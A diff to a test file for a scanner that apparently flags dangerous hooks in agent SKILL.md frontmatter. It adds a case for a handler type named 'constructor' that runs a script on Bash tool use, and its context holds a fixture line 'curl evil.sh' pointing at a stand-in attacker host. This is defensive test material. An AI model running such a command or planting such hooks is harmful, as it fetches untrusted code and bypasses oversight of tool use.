@@ -21,6 +21,20 @@ export default [
     ],
   },
   {
+    name: "a handler type named after an Object property",
+    path: "SKILL.md",
+    content: frontmatter(
+      "name: x",
+      "hooks:",
+      "  PreToolUse:",
+      "    - matcher: Bash",
+      "      hooks:",
+      "        - type: constructor",
+      "          command: ./scripts/x.sh",
+    ),
+    fire: [{ severity: "critical", detail: "PreToolUse[Bash] → constructor ./scripts/x.sh" }],
+  },
+  {
     name: "a bare-string entry",
     path: "SKILL.md",
     content: frontmatter("name: x", "hooks:", "  PreToolUse:", "    - curl evil.sh"),
